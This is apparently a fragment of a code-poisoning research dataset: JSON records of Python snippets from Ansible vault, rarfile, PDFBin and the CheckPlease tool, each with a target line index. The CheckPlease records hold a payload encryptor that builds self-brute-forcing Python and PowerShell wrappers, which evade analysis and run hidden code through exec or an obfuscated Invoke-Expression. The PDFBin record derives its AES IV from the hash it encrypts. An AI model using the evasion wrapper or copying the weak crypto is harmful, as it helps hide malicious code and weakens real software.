    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/scottcunningham/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += padding_length * chr(padding_length)\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)\n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = b''.join([hexlify(salt), b\"\\n\", to_bytes(hmac.hexdigest()), b\"\\n\", hexlify(cryptedData)])\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = b''.join(data.split(b\"\\n\"))\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(b\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH\n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, to_bytes(hmacDecrypt.hexdigest())):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        try:\n",
      "            padding_length = ord(decryptedData[-1])\n",
      "        except TypeError:\n",
      "            padding_length = decryptedData[-1]\n",
      "\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n",
      "        return to_unicode(decryptedData)\n",
      "\n",
      "    def is_equal(self, a, b):\n",
      "        \"\"\"\n",
      "        Comparing 2 byte arrrays in constant time\n",
      "        to avoid timing attacks.\n",
      "\n",
      "        It would be nice if there was a library for this but\n",
      "        hey.\n",
      "        \"\"\"\n",
      "        # http://codahale.com/a-lesson-in-timing-attacks/\n",
      "        if len(a) != len(b):\n",
      "            return False\n",
      "\n",
      "        result = 0\n",
      "        for x, y in zip(a, b):\n",
      "            if PY3:\n",
      "                result |= x ^ y\n",
      "            else:\n",
      "                result |= ord(x) ^ ord(y)\n",
      "        return result == 0\n",
      "\n"
    ],
    "target": 46,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/srluge/SickRage/lib/rarfile/__init__.py",
    "code": [
      "                    fd.seek(cur.add_size, 1)\n",
      "                continue\n",
      "            if cur.orig_filename != self.inf.orig_filename:\n",
      "                raise BadRarFile(\"Did not found file entry\")\n",
      "            self.cur = cur\n",
      "            self.cur_avail = cur.add_size\n",
      "            return True\n",
      "\n",
      "    if have_memoryview:\n",
      "        def readinto(self, buf):\n",
      "            \"\"\"Zero-copy read directly into buffer.\"\"\"\n",
      "            got = 0\n",
      "            vbuf = memoryview(buf)\n",
      "            while got < len(buf):\n",
      "                # next vol needed?\n",
      "                if self.cur_avail == 0:\n",
      "                    if not self._open_next():\n",
      "                        break\n",
      "\n",
      "                # lenght for next read\n",
      "                cnt = len(buf) - got\n",
      "                if cnt > self.cur_avail:\n",
      "                    cnt = self.cur_avail\n",
      "\n",
      "                # read into temp view\n",
      "                res = self.fd.readinto(vbuf[got : got + cnt])\n",
      "                if not res:\n",
      "                    break\n",
      "                if self.crc_check:\n",
      "                    self.CRC = crc32(vbuf[got : got + res], self.CRC)\n",
      "                self.cur_avail -= res\n",
      "                self.remain -= res\n",
      "                got += res\n",
      "            return got\n",
      "\n",
      "\n",
      "class HeaderDecrypt:\n",
      "    \"\"\"File-like object that decrypts from another file\"\"\"\n",
      "    def __init__(self, f, key, iv):\n",
      "        self.f = f\n",
      "        self.ciph = AES.new(key, AES.MODE_CBC, iv)\n",
      "        self.buf = EMPTY\n",
      "\n",
      "    def tell(self):\n",
      "        return self.f.tell()\n",
      "\n",
      "    def read(self, cnt=None):\n",
      "        if cnt > 8*1024:\n",
      "            raise BadRarFile('Bad count to header decrypt - wrong password?')\n",
      "\n",
      "        # consume old data\n",
      "        if cnt <= len(self.buf):\n",
      "            res = self.buf[:cnt]\n",
      "            self.buf = self.buf[cnt:]\n",
      "            return res\n",
      "        res = self.buf\n",
      "        self.buf = EMPTY\n",
      "        cnt -= len(res)\n",
      "\n",
      "        # decrypt new data\n",
      "        BLK = self.ciph.block_size\n",
      "        while cnt > 0:\n",
      "            enc = self.f.read(BLK)\n",
      "            if len(enc) < BLK:\n",
      "                break\n",
      "            dec = self.ciph.decrypt(enc)\n",
      "            if cnt >= len(dec):\n",
      "                res += dec\n",
      "                cnt -= len(dec)\n",
      "            else:\n",
      "                res += dec[:cnt]\n",
      "                self.buf = dec[cnt:]\n",
      "                cnt = 0\n",
      "\n",
      "        return res\n",
      "\n",
      "# handle (filename|filelike) object\n",
      "class XFile(object):\n",
      "    __slots__ = ('_fd', '_need_close')\n",
      "    def __init__(self, xfile, bufsize = 1024):\n",
      "        if is_filelike(xfile):\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/Arvanaghi/CheckPlease/Multi-Language Support/Delay-Analysis/bruteforce.py",
    "code": [
      "#!/usr/bin/env python3\n",
      "\n",
      "# AES encrypts code using a constrained keyspace\n",
      "# Source code brute forces itself at runtime to find\n",
      "# the key and run the original code\n",
      "\n",
      "import argparse\n",
      "import base64\n",
      "import random\n",
      "import string\n",
      "import sys\n",
      "from Crypto.Cipher import AES\n",
      "\n",
      "def constrained_aes(plaintext_data):\n",
      "    \"\"\"\n",
      "    Generates a constrained AES key which is later brute forced\n",
      "    in a loop\n",
      "    \"\"\"\n",
      "    # Create our constrained Key\n",
      "    small_key = randomKey(25)\n",
      "\n",
      "    # Actual Key used\n",
      "    real_key = small_key + str(randomNumbers())\n",
      "\n",
      "    # Create Cipher Object with Generated Secret Key\n",
      "    aes_cipher_object = AES.new(real_key, AES.MODE_ECB)\n",
      "\n",
      "    # Prep for manipulation (this is really for python stallion only)\n",
      "    # If this function as a whole is needed for another language\n",
      "    # It should probably be rewritten without this step\n",
      "    plaintext_data = plaintext_data.encode('latin-1')\n",
      "    plaintext_data = plaintext_data.decode('unicode_escape')\n",
      "\n",
      "    # Pad the shellcode\n",
      "    padded_shellcode = encryption_padding(plaintext_data, '*')\n",
      "\n",
      "    # actually encrypt the shellcode\n",
      "    encrypted_shellcode = aes_cipher_object.encrypt(padded_shellcode)\n",
      "\n",
      "    # Base64 encode the encrypted shellcode\n",
      "    encoded_ciphertext = base64.b64encode(encrypted_shellcode)\n",
      "\n",
      "    # return a tuple of (encodedText, small constrained key, actual key used)\n",
      "    return encoded_ciphertext, small_key, real_key\n",
      "\n",
      "def create_cli_parser():\n",
      "    parser = argparse.ArgumentParser(\n",
      "        add_help=False, description=\"BruteForcer encrypts code with a constrained\\\n",
      "        key resulting in code brute forcing itself at runtime.\")\n",
      "    parser.add_argument('-h', '-?', '--h', '-help',\n",
      "                        '--help', action=\"store_true\", help=argparse.SUPPRESS)\n",
      "\n",
      "    protocols = parser.add_argument_group('Options')\n",
      "    protocols.add_argument('-f', '--file', metavar='Filename', default=None,\n",
      "                           help='File containing data to encrypt')\n",
      "    protocols.add_argument('-py', '--python', default=False, action='store_true',\n",
      "                           help='Encrypting python code')\n",
      "    protocols.add_argument('-ps', '--powershell', default=False, action='store_true',\n",
      "                           help='Encrypting powershell code')\n",
      "    protocols.add_argument('-pl', '--perl', default=False, action='store_true',\n",
      "                           help='Encrypting perl code')\n",
      "\n",
      "    args = parser.parse_args()\n",
      "\n",
      "    if args.h:\n",
      "        parser.print_help()\n",
      "        sys.exit()\n",
      "\n",
      "    if args.file is None:\n",
      "        print('Error: You need to provide a file containing code to encrypt! Try again')\n",
      "        sys.exit(1)\n",
      "\n",
      "    if not args.python and not args.powershell and not args.perl:\n",
      "        print('You need to provide a language to encrypt! Try again...')\n",
      "        sys.exit(1)\n",
      "\n",
      "    return args\n",
      "\n",
      "def encryption_padding(data_to_pad, padding_letter=4):\n",
      "    if padding_letter == 4:\n",
      "        padding_letter = random.choice(string.ascii_letters + string.digits + \"{}!@#$^&()*&[]|,./?\")\n"
    ],
    "target": 25,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/Arvanaghi/CheckPlease/Multi-Language Support/Delay-Analysis/bruteforce.py",
    "code": [
      "# Taken from Veil code\n",
      "def randomKey(b=32):\n",
      "    \"\"\"\n",
      "    Returns a random string/key of \"b\" characters in length, defaults to 32\n",
      "    \"\"\"\n",
      "    return ''.join(random.choice(string.ascii_letters + string.digits + \"{}!@#$^&()*&[]|,./?\") for x in range(b))\n",
      "\n",
      "def randomNumbers(b=7):\n",
      "    \"\"\"\n",
      "    Returns a random string/key of \"b\" characters in length, defaults to 7\n",
      "    \"\"\"\n",
      "    random_number = int(''.join(random.choice(string.digits) for x in range(b))) + 100000\n",
      "\n",
      "    if random_number < 1000000:\n",
      "        random_number = random_number + 1000000\n",
      "\n",
      "    return random_number\n",
      "\n",
      "def randomString(length=-1):\n",
      "    \"\"\"\n",
      "    Returns a random string of \"length\" characters.\n",
      "    If no length is specified, resulting string is in between 6 and 15 characters.\n",
      "    \"\"\"\n",
      "    if length == -1:\n",
      "        length = random.randrange(6, 16)\n",
      "    random_string = ''.join(random.choice(string.ascii_letters) for x in range(length))\n",
      "    return random_string\n",
      "\n",
      "# let's start making code\n",
      "\n",
      "if __name__ == '__main__':\n",
      "\n",
      "    # Parse cli stuff\n",
      "    arguments = create_cli_parser()\n",
      "\n",
      "    # Grab a constrained random key and IV for encrypting stuff\n",
      "    aes_base_key = randomKey(25)\n",
      "    constrained_key = aes_base_key + str(randomNumbers())\n",
      "\n",
      "    # Create the encryption object\n",
      "    cipher_object = AES.new(constrained_key, AES.MODE_ECB)\n",
      "\n",
      "    # read in source code to encrypt\n",
      "    with open(arguments.file, 'rb') as incoming_data:\n",
      "        encrypt_me = incoming_data.read()\n",
      "\n",
      "    # add identifier at beginning of code to identify if it was successfully decrypted\n",
      "    if arguments.perl:\n",
      "        encrypt_me = b'DECRYPTED' + encrypt_me\n",
      "\n",
      "    # pad the source code (data should be in byte format)\n",
      "    padded_data = encryption_padding(encrypt_me, '&')\n",
      "    \n",
      "    # encrypt the padded souce code\n",
      "    encrypted_data = cipher_object.encrypt(padded_data)\n",
      "\n",
      "    # base64 encode the data\n",
      "    encoded_ciphertext = base64.b64encode(encrypted_data)\n",
      "\n",
      "    if arguments.python:\n",
      "        # begin creating final output code and add encoded_ciphertext to it\n",
      "        final_code = '#!/usr/bin/env python3\\n'\n",
      "        final_code += 'import base64\\n'\n",
      "        final_code += 'from Crypto.Cipher import AES\\n'\n",
      "        final_code += 'encoded_ct = \"' + encoded_ciphertext.decode('ascii') + '\"\\n'\n",
      "        final_code += 'decoded = base64.b64decode(encoded_ct)\\n'\n",
      "        final_code += 'for second_half in range(1000000, 10000000):\\n'\n",
      "        final_code += '\\tkey = \"' + aes_base_key + '\"\\n'\n",
      "        final_code += '\\tkey = key + str(second_half)\\n'\n",
      "        final_code += '\\tc_o = AES.new(key, AES.MODE_ECB)\\n'\n",
      "        final_code += '\\tdecrypted = c_o.decrypt(decoded)\\n'\n",
      "        final_code += '\\ttry:\\n'\n",
      "        final_code += '\\t\\tdecrypted = decrypted.decode(\"ascii\")\\n'\n",
      "        final_code += '\\t\\tdecrypted = decrypted.rstrip(\"&\")\\n'\n",
      "        final_code += '\\t\\texec(decrypted)\\n'\n",
      "        final_code += '\\texcept:\\n'\n",
      "        final_code += '\\t\\tpass'\n",
      "        file_name = 'encrypted.py'\n",
      "    \n",
      "    elif arguments.powershell:\n",
      "        # Modified from https://stackoverflow.com/questions/31007475/what-is-the-corresponding-powershell-module-for-the-php-encryption-library-using\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/Arvanaghi/CheckPlease/Multi-Language Support/Delay-Analysis/bruteforce.py",
    "code": [
      "\n",
      "if __name__ == '__main__':\n",
      "\n",
      "    # Parse cli stuff\n",
      "    arguments = create_cli_parser()\n",
      "\n",
      "    # Grab a constrained random key and IV for encrypting stuff\n",
      "    aes_base_key = randomKey(25)\n",
      "    constrained_key = aes_base_key + str(randomNumbers())\n",
      "\n",
      "    # Create the encryption object\n",
      "    cipher_object = AES.new(constrained_key, AES.MODE_ECB)\n",
      "\n",
      "    # read in source code to encrypt\n",
      "    with open(arguments.file, 'rb') as incoming_data:\n",
      "        encrypt_me = incoming_data.read()\n",
      "\n",
      "    # add identifier at beginning of code to identify if it was successfully decrypted\n",
      "    if arguments.perl:\n",
      "        encrypt_me = b'DECRYPTED' + encrypt_me\n",
      "\n",
      "    # pad the source code (data should be in byte format)\n",
      "    padded_data = encryption_padding(encrypt_me, '&')\n",
      "    \n",
      "    # encrypt the padded souce code\n",
      "    encrypted_data = cipher_object.encrypt(padded_data)\n",
      "\n",
      "    # base64 encode the data\n",
      "    encoded_ciphertext = base64.b64encode(encrypted_data)\n",
      "\n",
      "    if arguments.python:\n",
      "        # begin creating final output code and add encoded_ciphertext to it\n",
      "        final_code = '#!/usr/bin/env python3\\n'\n",
      "        final_code += 'import base64\\n'\n",
      "        final_code += 'from Crypto.Cipher import AES\\n'\n",
      "        final_code += 'encoded_ct = \"' + encoded_ciphertext.decode('ascii') + '\"\\n'\n",
      "        final_code += 'decoded = base64.b64decode(encoded_ct)\\n'\n",
      "        final_code += 'for second_half in range(1000000, 10000000):\\n'\n",
      "        final_code += '\\tkey = \"' + aes_base_key + '\"\\n'\n",
      "        final_code += '\\tkey = key + str(second_half)\\n'\n",
      "        final_code += '\\tc_o = AES.new(key, AES.MODE_ECB)\\n'\n",
      "        final_code += '\\tdecrypted = c_o.decrypt(decoded)\\n'\n",
      "        final_code += '\\ttry:\\n'\n",
      "        final_code += '\\t\\tdecrypted = decrypted.decode(\"ascii\")\\n'\n",
      "        final_code += '\\t\\tdecrypted = decrypted.rstrip(\"&\")\\n'\n",
      "        final_code += '\\t\\texec(decrypted)\\n'\n",
      "        final_code += '\\texcept:\\n'\n",
      "        final_code += '\\t\\tpass'\n",
      "        file_name = 'encrypted.py'\n",
      "    \n",
      "    elif arguments.powershell:\n",
      "        # Modified from https://stackoverflow.com/questions/31007475/what-is-the-corresponding-powershell-module-for-the-php-encryption-library-using\n",
      "        final_code = 'for ($i=1000000; $i -le 10000000; $i++) {\\n'\n",
      "        final_code += '$key = \"' + aes_base_key + '\" + $i\\n'\n",
      "        final_code += '$key = [System.Text.Encoding]::Ascii.GetBytes($key)\\n'\n",
      "        final_code += '$CipherText = \"' + encoded_ciphertext.decode('ascii') + '\"\\n'\n",
      "        final_code += '$RijndaelProvider = New-Object -TypeName System.Security.Cryptography.RijndaelManaged\\n'\n",
      "        final_code += '$RijndaelProvider.BlockSize = 128\\n'\n",
      "        final_code += '$RijndaelProvider.Mode      = [System.Security.Cryptography.CipherMode]::ECB\\n'\n",
      "        final_code += '$RijndaelProvider.Key       = $key\\n'\n",
      "        final_code += '$RijndaelProvider.Padding   = \"None\"\\n'\n",
      "        final_code += '$Decryptor = $RijndaelProvider.CreateDecryptor()\\n'\n",
      "        final_code += '$Cipher = [convert]::FromBase64String($CipherText) -as [byte[]]\\n'\n",
      "        final_code += '$DecMemoryStream = New-Object System.IO.MemoryStream -ArgumentList @(,$Cipher)\\n'\n",
      "        final_code += '$DecCryptoStream = New-Object System.Security.Cryptography.CryptoStream -ArgumentList $DecMemoryStream,$Decryptor,$([System.Security.Cryptography.CryptoStreamMode]::Read)\\n'\n",
      "        final_code += '$DecStreamWriter = New-Object System.IO.StreamReader -ArgumentList $DecCryptoStream\\n'\n",
      "        final_code += '$NewPlainText = $DecStreamWriter.ReadToEnd()\\n'\n",
      "        final_code += '$DecStreamWriter.Close()\\n'\n",
      "        final_code += '$DecCryptoStream.Close()\\n'\n",
      "        final_code += '$DecMemoryStream.Close()\\n'\n",
      "        final_code += '$NewPlainText = $NewPlainText -Replace \"[&]\",\"\"\\n'\n",
      "        final_code += '$command = $NewPlainText.Trim()\\n'\n",
      "        final_code += 'Try {\\n'\n",
      "        final_code += '`I`NV`o`ke`-`Exp`R`es`s`io`N $command\\n'\n",
      "        final_code += '}\\n'\n",
      "        final_code += 'Catch {\\n'\n",
      "        final_code += '#doit\\n'\n",
      "        final_code += '}\\n'\n",
      "        final_code += '}'\n",
      "        file_name = 'encrypted.ps1'\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/simobasso/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "        if not HAS_AES:\n",
      "            raise AnsibleError(CRYPTO_UPGRADE)\n",
      "\n",
      "    def aes_derive_key_and_iv(self, password, salt, key_length, iv_length):\n",
      "\n",
      "        \"\"\" Create a key and an initialization vector \"\"\"\n",
      "\n",
      "        d = d_i = b''\n",
      "        while len(d) < key_length + iv_length:\n",
      "            text = b''.join([d_i, password, salt])\n",
      "            d_i = to_bytes(md5(text).digest(), errors='strict')\n",
      "            d += d_i\n",
      "\n",
      "        key = d[:key_length]\n",
      "        iv = d[key_length:key_length+iv_length]\n",
      "\n",
      "        return key, iv\n",
      "\n",
      "    def encrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read plaintext data from in_file and write encrypted to out_file \"\"\"\n",
      "\n",
      "        raise AnsibleError(\"Encryption disabled for deprecated VaultAES class\")\n",
      "\n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = unhexlify(data)\n",
      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        tmpsalt = in_file.read(bs)\n",
      "        salt = tmpsalt[len(b'Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = b''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n",
      "            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n",
      "            if len(next_chunk) == 0:\n",
      "                if PY3:\n",
      "                    padding_length = chunk[-1]\n",
      "                else:\n",
      "                    padding_length = ord(chunk[-1])\n",
      "\n",
      "                chunk = chunk[:-padding_length]\n",
      "                finished = True\n",
      "\n",
      "            out_file.write(chunk)\n",
      "            out_file.flush()\n",
      "\n",
      "        # reset the stream pointer to the beginning\n",
      "        out_file.seek(0)\n",
      "        out_data = out_file.read()\n",
      "        out_file.close()\n",
      "\n",
      "        # split out sha and verify decryption\n",
      "        split_data = out_data.split(b\"\\n\", 1)\n",
      "        this_sha = split_data[0]\n",
      "        this_data = split_data[1]\n",
      "        test_sha = to_bytes(sha256(this_data).hexdigest())\n",
      "\n",
      "        if this_sha != test_sha:\n",
      "            raise AnsibleError(\"Decryption failed\")\n",
      "\n",
      "        return this_data\n",
      "\n",
      "\n",
      "class VaultAES256:\n",
      "\n",
      "    \"\"\"\n",
      "    Vault implementation using AES-CTR with an HMAC-SHA256 authentication code.\n",
      "    Keys are derived using PBKDF2\n",
      "    \"\"\"\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/simobasso/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "        if HAS_PBKDF2HMAC:\n",
      "            backend = default_backend()\n",
      "            kdf = PBKDF2HMAC(\n",
      "                algorithm=c_SHA256(),\n",
      "                length=2 * keylength + ivlength,\n",
      "                salt=salt,\n",
      "                iterations=10000,\n",
      "                backend=backend)\n",
      "            derivedkey = kdf.derive(password)\n",
      "        else:\n",
      "            derivedkey = self.create_key(password, salt, keylength, ivlength)\n",
      "\n",
      "        key1 = derivedkey[:keylength]\n",
      "        key2 = derivedkey[keylength:(keylength * 2)]\n",
      "        iv = derivedkey[(keylength * 2):(keylength * 2) + ivlength]\n",
      "\n",
      "        return key1, key2, hexlify(iv)\n",
      "\n",
      "\n",
      "    def encrypt(self, data, password):\n",
      "\n",
      "        salt = os.urandom(32)\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += to_bytes(padding_length * chr(padding_length), encoding='ascii', errors='strict')\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)\n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = b'\\n'.join([hexlify(salt), to_bytes(hmac.hexdigest()), hexlify(cryptedData)])\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(b\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH\n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, to_bytes(hmacDecrypt.hexdigest())):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        try:\n",
      "            padding_length = ord(decryptedData[-1])\n",
      "        except TypeError:\n",
      "            padding_length = decryptedData[-1]\n",
      "\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/simobasso/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)\n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = b'\\n'.join([hexlify(salt), to_bytes(hmac.hexdigest()), hexlify(cryptedData)])\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(b\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH\n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, to_bytes(hmacDecrypt.hexdigest())):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        try:\n",
      "            padding_length = ord(decryptedData[-1])\n",
      "        except TypeError:\n",
      "            padding_length = decryptedData[-1]\n",
      "\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n",
      "        return decryptedData\n",
      "\n",
      "    def is_equal(self, a, b):\n",
      "        \"\"\"\n",
      "        Comparing 2 byte arrrays in constant time\n",
      "        to avoid timing attacks.\n",
      "\n",
      "        It would be nice if there was a library for this but\n",
      "        hey.\n",
      "        \"\"\"\n",
      "        # http://codahale.com/a-lesson-in-timing-attacks/\n",
      "        if len(a) != len(b):\n",
      "            return False\n",
      "\n",
      "        result = 0\n",
      "        for x, y in zip(a, b):\n",
      "            if PY3:\n",
      "                result |= x ^ y\n",
      "            else:\n",
      "                result |= ord(x) ^ ord(y)\n",
      "        return result == 0\n",
      "\n",
      "\n",
      "# Keys could be made bytes later if the code that gets the data is more\n",
      "# naturally byte-oriented\n",
      "CIPHER_MAPPING = {\n",
      "        u'AES': VaultAES,\n",
      "        u'AES256': VaultAES256,\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/DForshner/PDFBin/bp_includes/lib/utils.py",
    "code": [
      "# *-* coding: UTF-8 *-*\n",
      "\n",
      "# standard library imports\n",
      "import os\n",
      "import re\n",
      "import random\n",
      "import hashlib\n",
      "import logging\n",
      "import string\n",
      "import unicodedata\n",
      "from datetime import datetime, timedelta\n",
      "import Cookie\n",
      "import webapp2\n",
      "\n",
      "\n",
      "def random_string(size=6, chars=string.ascii_letters + string.digits):\n",
      "    \"\"\" Generate random string \"\"\"\n",
      "    return ''.join(random.choice(chars) for _ in range(size))\n",
      "\n",
      "\n",
      "def hashing(plaintext, salt=\"\", sha=\"512\"):\n",
      "    \"\"\" Returns the hashed and encrypted hexdigest of a plaintext and salt\"\"\"\n",
      "    app = webapp2.get_app()\n",
      "\n",
      "    # Hashing\n",
      "    if sha == \"1\":\n",
      "        phrase = hashlib.sha1()\n",
      "    elif sha == \"256\":\n",
      "        phrase = hashlib.sha256()\n",
      "    else:\n",
      "        phrase = hashlib.sha512()\n",
      "    phrase.update(\"%s@%s\" % (plaintext, salt))\n",
      "    phrase_digest = phrase.hexdigest()\n",
      "\n",
      "    # Encryption (PyCrypto)\n",
      "    # wow... it's so secure :)\n",
      "    try:\n",
      "        from Crypto.Cipher import AES\n",
      "\n",
      "        mode = AES.MODE_CBC\n",
      "\n",
      "        # We can not generate random initialization vector because is difficult to retrieve them later without knowing\n",
      "        # a priori the hash to match. We take 16 bytes from the hexdigest to make the vectors different for each hashed\n",
      "        # plaintext.\n",
      "        iv = phrase_digest[:16]\n",
      "        encryptor = AES.new(app.config.get('aes_key'), mode, iv)\n",
      "        ciphertext = [encryptor.encrypt(chunk) for chunk in chunks(phrase_digest, 16)]\n",
      "        return ''.join(ciphertext)\n",
      "    except Exception, e:\n",
      "        logging.error(\"CRYPTO is not running: {}\".format(e))\n",
      "        raise\n",
      "\n",
      "\n",
      "def chunks(list, size):\n",
      "    \"\"\" Yield successive sized chunks from list. \"\"\"\n",
      "\n",
      "    for i in xrange(0, len(list), size):\n",
      "        yield list[i:i + size]\n",
      "\n",
      "\n",
      "def encode(plainText):\n",
      "    num = 0\n",
      "    key = \"0123456789abcdefghijklmnopqrstuvwxyz\"\n",
      "    key += \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n",
      "    for c in plainText: num = (num << 8) + ord(c)\n",
      "    encodedMsg = \"\"\n",
      "    while num > 0:\n",
